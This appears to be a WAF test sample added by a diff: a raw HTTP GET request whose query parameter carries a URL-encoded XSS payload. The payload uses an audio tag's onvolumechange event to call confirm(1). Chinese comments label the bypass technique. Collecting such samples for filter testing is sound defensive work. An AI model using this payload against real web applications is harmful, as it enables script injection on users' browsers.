@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_事件_audio标签_onvolumechange事件-06506682
+# 攻击载荷利用了HTML中的audio标签和onvolumechange属性，触发confirm()函数，显示一个提示框。需要音量调节触发
+GET /?id=%3Caudio%20autoplay%20controls%20onvolumechange=confirm%281%29%3E%3Csource%20src=%22validaudio.wav%22%20type=%22audio%2Fwav%22%3E%3C%2Faudio%3E&bid=hd_tag_m8mv25qo HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25qo
+RM-PRO-Token: e52877eb0ffab3365c206135e00decd7
+RM-PRO-Time: 1742808501446
+User-Agent: curl/7.83.1
+
